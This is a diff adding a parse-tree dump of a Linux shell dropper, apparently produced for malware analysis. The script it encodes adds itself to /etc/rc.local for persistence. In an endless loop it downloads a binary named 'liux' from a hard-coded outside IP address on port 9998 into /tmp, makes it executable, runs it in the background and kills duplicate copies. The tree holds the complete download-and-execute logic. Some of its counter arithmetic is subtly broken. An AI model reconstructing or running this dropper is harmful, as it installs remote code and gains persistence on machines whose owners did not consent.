@@ -1,0 +1,521 @@
+CompoundNode(lineno=10, list=[
+  IfNode(lineno=10, pos=(164, 331), parts=[
+    ReservedwordNode(lineno=6, pos=(164, 166), word='if'),
+    ListNode(lineno=6, pos=(167, 257), parts=[
+        CommandNode(lineno=6, pos=(167, 256), parts=[
+          WordNode(lineno=6, pos=(167, 168), word='['),
+          WordNode(lineno=6, pos=(169, 191), word='sh /etc/chongfu.sh &'),
+          WordNode(lineno=6, pos=(192, 193), word='='),
+          WordNode(lineno=6, pos=(194, 254), word='$(cat /etc/rc.local | grep /etc/chongfu.sh | grep -v grep)', parts=[
+            CommandsubstitutionNode(command=
+              PipelineNode(lineno=6, pos=(197, 252), parts=[
+                CommandNode(lineno=6, pos=(197, 214), parts=[
+                  WordNode(lineno=6, pos=(197, 200), word='cat'),
+                  WordNode(lineno=6, pos=(201, 214), word='/etc/rc.local'),
+                ]),
+                PipeNode(lineno=6, pipe='|', pos=(215, 216)),
+                CommandNode(lineno=6, pos=(217, 237), parts=[
+                  WordNode(lineno=6, pos=(217, 221), word='grep'),
+                  WordNode(lineno=6, pos=(222, 237), word='/etc/chongfu.sh'),
+                ]),
+                PipeNode(lineno=6, pipe='|', pos=(238, 239)),
+                CommandNode(lineno=6, pos=(240, 252), parts=[
+                  WordNode(lineno=6, pos=(240, 244), word='grep'),
+                  WordNode(lineno=6, pos=(245, 247), word='-v'),
+                  WordNode(lineno=6, pos=(248, 252), word='grep'),
+                ]),
+              ]), lineno=6, pos=(195, 253)),
+          ]),
+          WordNode(lineno=6, pos=(255, 256), word=']'),
+        ]),
+        OperatorNode(lineno=6, op=';', pos=(256, 257)),
+      ]),
+    ReservedwordNode(lineno=6, pos=(258, 262), word='then'),
+    CommandNode(lineno=7, pos=(267, 274), parts=[
+      WordNode(lineno=7, pos=(267, 271), word='echo'),
+      WordNode(lineno=7, pos=(272, 274)),
+    ]),
+    ReservedwordNode(lineno=8, pos=(275, 279), word='else'),
+    CommandNode(lineno=9, pos=(284, 328), parts=[
+      WordNode(lineno=9, pos=(284, 288), word='echo'),
+      WordNode(lineno=9, pos=(289, 311), word='sh /etc/chongfu.sh &'),
+      RedirectNode(lineno=9, output=
+        WordNode(lineno=9, pos=(315, 328), word='/etc/rc.local'), pos=(312, 328), type='>>'),
+    ]),
+    ReservedwordNode(lineno=10, pos=(329, 331), word='fi'),
+  ]),
+], pos=(164, 331))
+CompoundNode(lineno=72, list=[
+  WhileNode(lineno=72, pos=(333, 2246), parts=[
+    ReservedwordNode(lineno=12, pos=(333, 338), word='while'),
+    ListNode(lineno=12, pos=(339, 345), parts=[
+        CommandNode(lineno=12, pos=(339, 344), parts=[
+          WordNode(lineno=12, pos=(339, 340), word='['),
+          WordNode(lineno=12, pos=(341, 342), word='1'),
+          WordNode(lineno=12, pos=(343, 344), word=']'),
+        ]),
+        OperatorNode(lineno=12, op=';', pos=(344, 345)),
+      ]),
+    ReservedwordNode(lineno=12, pos=(346, 348), word='do'),
+    ListNode(lineno=72, pos=(353, 2242), parts=[
+        CommandNode(lineno=13, pos=(353, 422), parts=[
+          AssignmentNode(lineno=13, pos=(353, 422), word='Centos_sshd_killn=$(ps aux | grep "/tmp/liux" | grep -v grep | wc -l)', parts=[
+            CommandsubstitutionNode(command=
+              PipelineNode(lineno=12, pos=(373, 421), parts=[
+                CommandNode(lineno=12, pos=(373, 379), parts=[
+                  WordNode(lineno=12, pos=(373, 375), word='ps'),
+                  WordNode(lineno=12, pos=(376, 379), word='aux'),
+                ]),
+                PipeNode(lineno=12, pipe='|', pos=(380, 381)),
+                CommandNode(lineno=12, pos=(382, 398), parts=[
+                  WordNode(lineno=12, pos=(382, 386), word='grep'),
+                  WordNode(lineno=12, pos=(387, 398), word='/tmp/liux'),
+                ]),
+                PipeNode(lineno=12, pipe='|', pos=(399, 400)),
+                CommandNode(lineno=12, pos=(401, 413), parts=[
+                  WordNode(lineno=12, pos=(401, 405), word='grep'),
+                  WordNode(lineno=12, pos=(406, 408), word='-v'),
+                  WordNode(lineno=12, pos=(409, 413), word='grep'),
+                ]),
+                PipeNode(lineno=12, pipe='|', pos=(414, 415)),
+                CommandNode(lineno=12, pos=(416, 421), parts=[
+                  WordNode(lineno=12, pos=(416, 418), word='wc'),
+                  WordNode(lineno=12, pos=(419, 421), word='-l'),
+                ]),
+              ]), lineno=12, pos=(371, 422)),
+          ]),
+        ]),
+        OperatorNode(lineno=14, op='\n', pos=(422, 423)),
+        CompoundNode(lineno=40, list=[
+          IfNode(lineno=40, pos=(427, 1290), parts=[
+            ReservedwordNode(lineno=14, pos=(427, 429), word='if'),
+            ListNode(lineno=14, pos=(430, 459), parts=[
+                CommandNode(lineno=14, pos=(430, 458), parts=[
+                  WordNode(lineno=14, pos=(430, 431), word='['),
+                  WordNode(lineno=14, pos=(432, 450), word='$Centos_sshd_killn', parts=[
+                    ParameterNode(lineno=14, pos=(432, 450), value='Centos_sshd_killn'),
+                  ]),
+                  WordNode(lineno=14, pos=(451, 454), word='-eq'),
+                  WordNode(lineno=14, pos=(455, 456), word='0'),
+                  WordNode(lineno=14, pos=(457, 458), word=']'),
+                ]),
+                OperatorNode(lineno=14, op=';', pos=(458, 459)),
+              ]),
+            ReservedwordNode(lineno=14, pos=(460, 464), word='then'),
+            ListNode(lineno=27, pos=(473, 906), parts=[
+                CompoundNode(lineno=26, list=[
+                  IfNode(lineno=26, pos=(473, 886), parts=[
+                    ReservedwordNode(lineno=15, pos=(473, 475), word='if'),
+                    ListNode(lineno=15, pos=(476, 497), parts=[
+                        CommandNode(lineno=15, pos=(476, 496), parts=[
+                          WordNode(lineno=15, pos=(476, 477), word='['),
+                          WordNode(lineno=15, pos=(478, 479), word='!'),
+                          WordNode(lineno=15, pos=(480, 482), word='-f'),
+                          WordNode(lineno=15, pos=(483, 494), word='/tmp/liux'),
+                          WordNode(lineno=15, pos=(495, 496), word=']'),
+                        ]),
+                        OperatorNode(lineno=15, op=';', pos=(496, 497)),
+                      ]),
+                    ReservedwordNode(lineno=15, pos=(498, 502), word='then'),
+                    CompoundNode(lineno=25, list=[
+                      IfNode(lineno=25, pos=(515, 875), parts=[
+                        ReservedwordNode(lineno=16, pos=(515, 517), word='if'),
+                        ListNode(lineno=16, pos=(518, 541), parts=[
+                            CommandNode(lineno=16, pos=(518, 540), parts=[
+                              WordNode(lineno=16, pos=(518, 519), word='['),
+                              WordNode(lineno=16, pos=(520, 522), word='-f'),
+                              WordNode(lineno=16, pos=(523, 538), word='/usr/bin/wget'),
+                              WordNode(lineno=16, pos=(539, 540), word=']'),
+                            ]),
+                            OperatorNode(lineno=16, op=';', pos=(540, 541)),
+                          ]),
+                        ReservedwordNode(lineno=16, pos=(542, 546), word='then'),
+                        ListNode(lineno=23, pos=(563, 813), parts=[
+                            CommandNode(lineno=17, pos=(563, 581), parts=[
+                              WordNode(lineno=17, pos=(563, 565), word='cp'),
+                              WordNode(lineno=17, pos=(566, 579), word='/usr/bin/wget'),
+                              WordNode(lineno=17, pos=(580, 581), word='.'),
+                            ]),
+                            OperatorNode(lineno=18, op='\n', pos=(581, 582)),
+                            CommandNode(lineno=18, pos=(598, 611), parts=[
+                              WordNode(lineno=18, pos=(598, 603), word='chmod'),
+                              WordNode(lineno=18, pos=(604, 606), word='+x'),
+                              WordNode(lineno=18, pos=(607, 611), word='wget'),
+                            ]),
+                            OperatorNode(lineno=19, op='\n', pos=(611, 612)),
+                            CommandNode(lineno=20, pos=(688, 748), parts=[
+                              WordNode(lineno=20, pos=(688, 694), word='./wget'),
+                              WordNode(lineno=20, pos=(695, 697), word='-P'),
+                              WordNode(lineno=20, pos=(698, 703), word='/tmp/'),
+                              WordNode(lineno=20, pos=(705, 735), word='http://60.250.99.131:9998/liux'),
+                              RedirectNode(lineno=20, output=
+                                WordNode(lineno=20, pos=(739, 748), word='/dev/null'), pos=(736, 748), type='&>'),
+                            ]),
+                            OperatorNode(lineno=21, op='\n', pos=(748, 749)),
+                            CommandNode(lineno=21, pos=(765, 784), parts=[
+                              WordNode(lineno=21, pos=(765, 770), word='chmod'),
+                              WordNode(lineno=21, pos=(771, 774), word='755'),
+                              WordNode(lineno=21, pos=(775, 784), word='/tmp/liux'),
+                            ]),
+                            OperatorNode(lineno=22, op='\n', pos=(784, 785)),
+                            CommandNode(lineno=22, pos=(801, 812), parts=[
+                              WordNode(lineno=22, pos=(801, 803), word='rm'),
+                              WordNode(lineno=22, pos=(804, 808), word='wget'),
+                              WordNode(lineno=22, pos=(809, 812), word='-rf'),
+                            ]),
+                            OperatorNode(lineno=23, op='\n', pos=(812, 813)),
+                          ]),
+                        ReservedwordNode(lineno=23, pos=(825, 829), word='else'),
+                        CommandNode(lineno=24, pos=(846, 860), parts=[
+                          WordNode(lineno=24, pos=(846, 850), word='echo'),
+                          WordNode(lineno=24, pos=(851, 860), word='No wget'),
+                        ]),
+                        ReservedwordNode(lineno=25, pos=(873, 875), word='fi'),
+                      ]),
+                    ], pos=(515, 875)),
+                    ReservedwordNode(lineno=26, pos=(884, 886), word='fi'),
+                  ]),
+                ], pos=(473, 886)),
+                OperatorNode(lineno=27, op='\n', pos=(886, 887)),
+                CommandNode(lineno=27, pos=(895, 904), parts=[
+                  WordNode(lineno=27, pos=(895, 904), word='/tmp/liux'),
+                ]),
+                OperatorNode(lineno=27, op='&', pos=(905, 906)),
+              ]),
+            ReservedwordNode(lineno=29, pos=(929, 933), word='elif'),
+            ListNode(lineno=29, pos=(934, 963), parts=[
+                CommandNode(lineno=29, pos=(934, 962), parts=[
+                  WordNode(lineno=29, pos=(934, 935), word='['),
+                  WordNode(lineno=29, pos=(936, 954), word='$Centos_sshd_killn', parts=[
+                    ParameterNode(lineno=29, pos=(936, 954), value='Centos_sshd_killn'),
+                  ]),
+                  WordNode(lineno=29, pos=(955, 958), word='-gt'),
+                  WordNode(lineno=29, pos=(959, 960), word='1'),
+                  WordNode(lineno=29, pos=(961, 962), word=']'),
+                ]),
+                OperatorNode(lineno=29, op=';', pos=(962, 963)),
+              ]),
+            ReservedwordNode(lineno=29, pos=(964, 968), word='then'),
+            CompoundNode(lineno=37, list=[
+              ForNode(lineno=37, pos=(977, 1258), parts=[
+                ReservedwordNode(lineno=30, pos=(977, 980), word='for'),
+                WordNode(lineno=30, pos=(981, 987), word='killed'),
+                ReservedwordNode(lineno=30, pos=(988, 990), word='in'),
+                WordNode(lineno=30, pos=(991, 1048), word='$(ps aux | grep "liux" | grep -v grep | awk \'{print $2}\')', parts=[
+                  CommandsubstitutionNode(command=
+                    PipelineNode(lineno=12, pos=(993, 1047), parts=[
+                      CommandNode(lineno=12, pos=(993, 999), parts=[
+                        WordNode(lineno=12, pos=(993, 995), word='ps'),
+                        WordNode(lineno=12, pos=(996, 999), word='aux'),
+                      ]),
+                      PipeNode(lineno=12, pipe='|', pos=(1000, 1001)),
+                      CommandNode(lineno=12, pos=(1002, 1013), parts=[
+                        WordNode(lineno=12, pos=(1002, 1006), word='grep'),
+                        WordNode(lineno=12, pos=(1007, 1013), word='liux'),
+                      ]),
+                      PipeNode(lineno=12, pipe='|', pos=(1014, 1015)),
+                      CommandNode(lineno=12, pos=(1016, 1028), parts=[
+                        WordNode(lineno=12, pos=(1016, 1020), word='grep'),
+                        WordNode(lineno=12, pos=(1021, 1023), word='-v'),
+                        WordNode(lineno=12, pos=(1024, 1028), word='grep'),
+                      ]),
+                      PipeNode(lineno=12, pipe='|', pos=(1029, 1030)),
+                      CommandNode(lineno=12, pos=(1031, 1047), parts=[
+                        WordNode(lineno=12, pos=(1031, 1034), word='awk'),
+                        WordNode(lineno=12, pos=(1035, 1047), word='{print $2}'),
+                      ]),
+                    ]), lineno=12, pos=(991, 1048)),
+                ]),
+                ReservedwordNode(lineno=30, pos=(1048, 1049), word=';'),
+                ReservedwordNode(lineno=30, pos=(1050, 1052), word='do'),
+                ListNode(lineno=37, pos=(1065, 1246), parts=[
+                    CommandNode(lineno=31, pos=(1065, 1106), parts=[
+                      AssignmentNode(lineno=31, pos=(1065, 1106), word='Centos_sshd_killn=$($Centos_sshd_killn-1)', parts=[
+                        CommandsubstitutionNode(command=
+                          CommandNode(lineno=12, pos=(1085, 1105), parts=[
+                            WordNode(lineno=12, pos=(1085, 1105), word='$Centos_sshd_killn-1', parts=[
+                              ParameterNode(lineno=12, pos=(1085, 1103), value='Centos_sshd_killn'),
+                            ]),
+                          ]), lineno=12, pos=(1083, 1106)),
+                      ]),
+                    ]),
+                    OperatorNode(lineno=32, op='\n', pos=(1106, 1107)),
+                    CompoundNode(lineno=36, list=[
+                      IfNode(lineno=36, pos=(1119, 1245), parts=[
+                        ReservedwordNode(lineno=32, pos=(1119, 1121), word='if'),
+                        ListNode(lineno=32, pos=(1122, 1151), parts=[
+                            CommandNode(lineno=32, pos=(1122, 1150), parts=[
+                              WordNode(lineno=32, pos=(1122, 1123), word='['),
+                              WordNode(lineno=32, pos=(1124, 1142), word='$Centos_sshd_killn', parts=[
+                                ParameterNode(lineno=32, pos=(1124, 1142), value='Centos_sshd_killn'),
+                              ]),
+                              WordNode(lineno=32, pos=(1143, 1146), word='-eq'),
+                              WordNode(lineno=32, pos=(1147, 1148), word='1'),
+                              WordNode(lineno=32, pos=(1149, 1150), word=']'),
+                            ]),
+                            OperatorNode(lineno=32, op=';', pos=(1150, 1151)),
+                          ]),
+                        ReservedwordNode(lineno=32, pos=(1152, 1156), word='then'),
+                        CommandNode(lineno=33, pos=(1173, 1181), parts=[
+                          WordNode(lineno=33, pos=(1173, 1181), word='continue'),
+                        ]),
+                        ReservedwordNode(lineno=34, pos=(1194, 1198), word='else'),
+                        CommandNode(lineno=35, pos=(1215, 1230), parts=[
+                          WordNode(lineno=35, pos=(1215, 1219), word='kill'),
+                          WordNode(lineno=35, pos=(1220, 1222), word='-9'),
+                          WordNode(lineno=35, pos=(1223, 1230), word='$killed', parts=[
+                            ParameterNode(lineno=35, pos=(1223, 1230), value='killed'),
+                          ]),
+                        ]),
+                        ReservedwordNode(lineno=36, pos=(1243, 1245), word='fi'),
+                      ]),
+                    ], pos=(1119, 1245)),
+                    OperatorNode(lineno=37, op='\n', pos=(1245, 1246)),
+                  ]),
+                ReservedwordNode(lineno=37, pos=(1254, 1258), word='done'),
+              ]),
+            ], pos=(977, 1258)),
+            ReservedwordNode(lineno=38, pos=(1263, 1267), word='else'),
+            CommandNode(lineno=39, pos=(1276, 1283), parts=[
+              WordNode(lineno=39, pos=(1276, 1280), word='echo'),
+              WordNode(lineno=39, pos=(1281, 1283)),
+            ]),
+            ReservedwordNode(lineno=40, pos=(1288, 1290), word='fi'),
+          ]),
+        ], pos=(427, 1290)),
+        OperatorNode(lineno=41, op='\n', pos=(1290, 1291)),
+        CommandNode(lineno=42, pos=(1296, 1364), parts=[
+          AssignmentNode(lineno=42, pos=(1296, 1364), word='Centos_ssh_killn=$(ps aux | grep "/tmp/liux" | grep -v grep | wc -l)', parts=[
+            CommandsubstitutionNode(command=
+              PipelineNode(lineno=12, pos=(1315, 1363), parts=[
+                CommandNode(lineno=12, pos=(1315, 1321), parts=[
+                  WordNode(lineno=12, pos=(1315, 1317), word='ps'),
+                  WordNode(lineno=12, pos=(1318, 1321), word='aux'),
+                ]),
+                PipeNode(lineno=12, pipe='|', pos=(1322, 1323)),
+                CommandNode(lineno=12, pos=(1324, 1340), parts=[
+                  WordNode(lineno=12, pos=(1324, 1328), word='grep'),
+                  WordNode(lineno=12, pos=(1329, 1340), word='/tmp/liux'),
+                ]),
+                PipeNode(lineno=12, pipe='|', pos=(1341, 1342)),
+                CommandNode(lineno=12, pos=(1343, 1355), parts=[
+                  WordNode(lineno=12, pos=(1343, 1347), word='grep'),
+                  WordNode(lineno=12, pos=(1348, 1350), word='-v'),
+                  WordNode(lineno=12, pos=(1351, 1355), word='grep'),
+                ]),
+                PipeNode(lineno=12, pipe='|', pos=(1356, 1357)),
+                CommandNode(lineno=12, pos=(1358, 1363), parts=[
+                  WordNode(lineno=12, pos=(1358, 1360), word='wc'),
+                  WordNode(lineno=12, pos=(1361, 1363), word='-l'),
+                ]),
+              ]), lineno=12, pos=(1313, 1364)),
+          ]),
+        ]),
+        OperatorNode(lineno=43, op='\n', pos=(1364, 1365)),
+        CompoundNode(lineno=69, list=[
+          IfNode(lineno=69, pos=(1369, 2226), parts=[
+            ReservedwordNode(lineno=43, pos=(1369, 1371), word='if'),
+            ListNode(lineno=43, pos=(1372, 1400), parts=[
+                CommandNode(lineno=43, pos=(1372, 1399), parts=[
+                  WordNode(lineno=43, pos=(1372, 1373), word='['),
+                  WordNode(lineno=43, pos=(1374, 1391), word='$Centos_ssh_killn', parts=[
+                    ParameterNode(lineno=43, pos=(1374, 1391), value='Centos_ssh_killn'),
+                  ]),
+                  WordNode(lineno=43, pos=(1392, 1395), word='-eq'),
+                  WordNode(lineno=43, pos=(1396, 1397), word='0'),
+                  WordNode(lineno=43, pos=(1398, 1399), word=']'),
+                ]),
+                OperatorNode(lineno=43, op=';', pos=(1399, 1400)),
+              ]),
+            ReservedwordNode(lineno=43, pos=(1401, 1405), word='then'),
+            ListNode(lineno=56, pos=(1414, 1848), parts=[
+                CompoundNode(lineno=55, list=[
+                  IfNode(lineno=55, pos=(1414, 1828), parts=[
+                    ReservedwordNode(lineno=44, pos=(1414, 1416), word='if'),
+                    ListNode(lineno=44, pos=(1417, 1438), parts=[
+                        CommandNode(lineno=44, pos=(1417, 1437), parts=[
+                          WordNode(lineno=44, pos=(1417, 1418), word='['),
+                          WordNode(lineno=44, pos=(1419, 1420), word='!'),
+                          WordNode(lineno=44, pos=(1421, 1423), word='-f'),
+                          WordNode(lineno=44, pos=(1424, 1435), word='/tmp/liux'),
+                          WordNode(lineno=44, pos=(1436, 1437), word=']'),
+                        ]),
+                        OperatorNode(lineno=44, op=';', pos=(1437, 1438)),
+                      ]),
+                    ReservedwordNode(lineno=44, pos=(1439, 1443), word='then'),
+                    CompoundNode(lineno=54, list=[
+                      IfNode(lineno=54, pos=(1456, 1817), parts=[
+                        ReservedwordNode(lineno=45, pos=(1456, 1458), word='if'),
+                        ListNode(lineno=45, pos=(1459, 1482), parts=[
+                            CommandNode(lineno=45, pos=(1459, 1481), parts=[
+                              WordNode(lineno=45, pos=(1459, 1460), word='['),
+                              WordNode(lineno=45, pos=(1461, 1463), word='-f'),
+                              WordNode(lineno=45, pos=(1464, 1479), word='/usr/bin/wget'),
+                              WordNode(lineno=45, pos=(1480, 1481), word=']'),
+                            ]),
+                            OperatorNode(lineno=45, op=';', pos=(1481, 1482)),
+                          ]),
+                        ReservedwordNode(lineno=45, pos=(1483, 1487), word='then'),
+                        ListNode(lineno=52, pos=(1504, 1755), parts=[
+                            CommandNode(lineno=46, pos=(1504, 1522), parts=[
+                              WordNode(lineno=46, pos=(1504, 1506), word='cp'),
+                              WordNode(lineno=46, pos=(1507, 1520), word='/usr/bin/wget'),
+                              WordNode(lineno=46, pos=(1521, 1522), word='.'),
+                            ]),
+                            OperatorNode(lineno=47, op='\n', pos=(1522, 1523)),
+                            CommandNode(lineno=47, pos=(1539, 1552), parts=[
+                              WordNode(lineno=47, pos=(1539, 1544), word='chmod'),
+                              WordNode(lineno=47, pos=(1545, 1547), word='+x'),
+                              WordNode(lineno=47, pos=(1548, 1552), word='wget'),
+                            ]),
+                            OperatorNode(lineno=48, op='\n', pos=(1552, 1553)),
+                            CommandNode(lineno=49, pos=(1630, 1690), parts=[
+                              WordNode(lineno=49, pos=(1630, 1636), word='./wget'),
+                              WordNode(lineno=49, pos=(1637, 1639), word='-P'),
+                              WordNode(lineno=49, pos=(1640, 1645), word='/tmp/'),
+                              WordNode(lineno=49, pos=(1647, 1677), word='http://60.250.99.131:9998/liux'),
+                              RedirectNode(lineno=49, output=
+                                WordNode(lineno=49, pos=(1681, 1690), word='/dev/null'), pos=(1678, 1690), type='&>'),
+                            ]),
+                            OperatorNode(lineno=50, op='\n', pos=(1690, 1691)),
+                            CommandNode(lineno=50, pos=(1707, 1726), parts=[
+                              WordNode(lineno=50, pos=(1707, 1712), word='chmod'),
+                              WordNode(lineno=50, pos=(1713, 1716), word='755'),
+                              WordNode(lineno=50, pos=(1717, 1726), word='/tmp/liux'),
+                            ]),
+                            OperatorNode(lineno=51, op='\n', pos=(1726, 1727)),
+                            CommandNode(lineno=51, pos=(1743, 1754), parts=[
+                              WordNode(lineno=51, pos=(1743, 1745), word='rm'),
+                              WordNode(lineno=51, pos=(1746, 1750), word='wget'),
+                              WordNode(lineno=51, pos=(1751, 1754), word='-rf'),
+                            ]),
+                            OperatorNode(lineno=52, op='\n', pos=(1754, 1755)),
+                          ]),
+                        ReservedwordNode(lineno=52, pos=(1767, 1771), word='else'),
+                        CommandNode(lineno=53, pos=(1788, 1802), parts=[
+                          WordNode(lineno=53, pos=(1788, 1792), word='echo'),
+                          WordNode(lineno=53, pos=(1793, 1802), word='No wget'),
+                        ]),
+                        ReservedwordNode(lineno=54, pos=(1815, 1817), word='fi'),
+                      ]),
+                    ], pos=(1456, 1817)),
+                    ReservedwordNode(lineno=55, pos=(1826, 1828), word='fi'),
+                  ]),
+                ], pos=(1414, 1828)),
+                OperatorNode(lineno=56, op='\n', pos=(1828, 1829)),
+                CommandNode(lineno=56, pos=(1837, 1846), parts=[
+                  WordNode(lineno=56, pos=(1837, 1846), word='/tmp/liux'),
+                ]),
+                OperatorNode(lineno=56, op='&', pos=(1847, 1848)),
+              ]),
+            ReservedwordNode(lineno=58, pos=(1871, 1875), word='elif'),
+            ListNode(lineno=58, pos=(1876, 1904), parts=[
+                CommandNode(lineno=58, pos=(1876, 1903), parts=[
+                  WordNode(lineno=58, pos=(1876, 1877), word='['),
+                  WordNode(lineno=58, pos=(1878, 1895), word='$Centos_ssh_killn', parts=[
+                    ParameterNode(lineno=58, pos=(1878, 1895), value='Centos_ssh_killn'),
+                  ]),
+                  WordNode(lineno=58, pos=(1896, 1899), word='-gt'),
+                  WordNode(lineno=58, pos=(1900, 1901), word='1'),
+                  WordNode(lineno=58, pos=(1902, 1903), word=']'),
+                ]),
+                OperatorNode(lineno=58, op=';', pos=(1903, 1904)),
+              ]),
+            ReservedwordNode(lineno=58, pos=(1905, 1909), word='then'),
+            CompoundNode(lineno=66, list=[
+              ForNode(lineno=66, pos=(1918, 2194), parts=[
+                ReservedwordNode(lineno=59, pos=(1918, 1921), word='for'),
+                WordNode(lineno=59, pos=(1922, 1928), word='killed'),
+                ReservedwordNode(lineno=59, pos=(1929, 1931), word='in'),
+                WordNode(lineno=59, pos=(1932, 1989), word='$(ps aux | grep "liux" | grep -v grep | awk \'{print $2}\')', parts=[
+                  CommandsubstitutionNode(command=
+                    PipelineNode(lineno=12, pos=(1934, 1988), parts=[
+                      CommandNode(lineno=12, pos=(1934, 1940), parts=[
+                        WordNode(lineno=12, pos=(1934, 1936), word='ps'),
+                        WordNode(lineno=12, pos=(1937, 1940), word='aux'),
+                      ]),
+                      PipeNode(lineno=12, pipe='|', pos=(1941, 1942)),
+                      CommandNode(lineno=12, pos=(1943, 1954), parts=[
+                        WordNode(lineno=12, pos=(1943, 1947), word='grep'),
+                        WordNode(lineno=12, pos=(1948, 1954), word='liux'),
+                      ]),
+                      PipeNode(lineno=12, pipe='|', pos=(1955, 1956)),
+                      CommandNode(lineno=12, pos=(1957, 1969), parts=[
+                        WordNode(lineno=12, pos=(1957, 1961), word='grep'),
+                        WordNode(lineno=12, pos=(1962, 1964), word='-v'),
+                        WordNode(lineno=12, pos=(1965, 1969), word='grep'),
+                      ]),
+                      PipeNode(lineno=12, pipe='|', pos=(1970, 1971)),
+                      CommandNode(lineno=12, pos=(1972, 1988), parts=[
+                        WordNode(lineno=12, pos=(1972, 1975), word='awk'),
+                        WordNode(lineno=12, pos=(1976, 1988), word='{print $2}'),
+                      ]),
+                    ]), lineno=12, pos=(1932, 1989)),
+                ]),
+                ReservedwordNode(lineno=59, pos=(1989, 1990), word=';'),
+                ReservedwordNode(lineno=59, pos=(1991, 1993), word='do'),
+                ListNode(lineno=66, pos=(2006, 2182), parts=[
+                    CommandNode(lineno=60, pos=(2006, 2043), parts=[
+                      AssignmentNode(lineno=60, pos=(2006, 2043), word='Centos_ssh_killn=$($Centos_ssh_killn)', parts=[
+                        CommandsubstitutionNode(command=
+                          CommandNode(lineno=12, pos=(2025, 2042), parts=[
+                            WordNode(lineno=12, pos=(2025, 2042), word='$Centos_ssh_killn', parts=[
+                              ParameterNode(lineno=12, pos=(2025, 2042), value='Centos_ssh_killn'),
+                            ]),
+                          ]), lineno=12, pos=(2023, 2043)),
+                      ]),
+                    ]),
+                    OperatorNode(lineno=61, op='\n', pos=(2043, 2044)),
+                    CompoundNode(lineno=65, list=[
+                      IfNode(lineno=65, pos=(2056, 2181), parts=[
+                        ReservedwordNode(lineno=61, pos=(2056, 2058), word='if'),
+                        ListNode(lineno=61, pos=(2059, 2087), parts=[
+                            CommandNode(lineno=61, pos=(2059, 2086), parts=[
+                              WordNode(lineno=61, pos=(2059, 2060), word='['),
+                              WordNode(lineno=61, pos=(2061, 2078), word='$Centos_ssh_killn', parts=[
+                                ParameterNode(lineno=61, pos=(2061, 2078), value='Centos_ssh_killn'),
+                              ]),
+                              WordNode(lineno=61, pos=(2079, 2082), word='-eq'),
+                              WordNode(lineno=61, pos=(2083, 2084), word='1'),
+                              WordNode(lineno=61, pos=(2085, 2086), word=']'),
+                            ]),
+                            OperatorNode(lineno=61, op=';', pos=(2086, 2087)),
+                          ]),
+                        ReservedwordNode(lineno=61, pos=(2088, 2092), word='then'),
+                        CommandNode(lineno=62, pos=(2109, 2117), parts=[
+                          WordNode(lineno=62, pos=(2109, 2117), word='continue'),
+                        ]),
+                        ReservedwordNode(lineno=63, pos=(2130, 2134), word='else'),
+                        CommandNode(lineno=64, pos=(2151, 2166), parts=[
+                          WordNode(lineno=64, pos=(2151, 2155), word='kill'),
+                          WordNode(lineno=64, pos=(2156, 2158), word='-9'),
+                          WordNode(lineno=64, pos=(2159, 2166), word='$killed', parts=[
+                            ParameterNode(lineno=64, pos=(2159, 2166), value='killed'),
+                          ]),
+                        ]),
+                        ReservedwordNode(lineno=65, pos=(2179, 2181), word='fi'),
+                      ]),
+                    ], pos=(2056, 2181)),
+                    OperatorNode(lineno=66, op='\n', pos=(2181, 2182)),
+                  ]),
+                ReservedwordNode(lineno=66, pos=(2190, 2194), word='done'),
+              ]),
+            ], pos=(1918, 2194)),
+            ReservedwordNode(lineno=67, pos=(2199, 2203), word='else'),
+            CommandNode(lineno=68, pos=(2212, 2219), parts=[
+              WordNode(lineno=68, pos=(2212, 2216), word='echo'),
+              WordNode(lineno=68, pos=(2217, 2219)),
+            ]),
+            ReservedwordNode(lineno=69, pos=(2224, 2226), word='fi'),
+          ]),
+        ], pos=(1369, 2226)),
+        OperatorNode(lineno=70, op='\n', pos=(2226, 2227)),
+        CommandNode(lineno=71, pos=(2232, 2241), parts=[
+          WordNode(lineno=71, pos=(2232, 2237), word='sleep'),
+          WordNode(lineno=71, pos=(2238, 2241), word='999'),
+        ]),
+        OperatorNode(lineno=72, op='\n', pos=(2241, 2242)),
+      ]),
+    ReservedwordNode(lineno=72, pos=(2242, 2246), word='done'),
+  ]),
+], pos=(333, 2246))
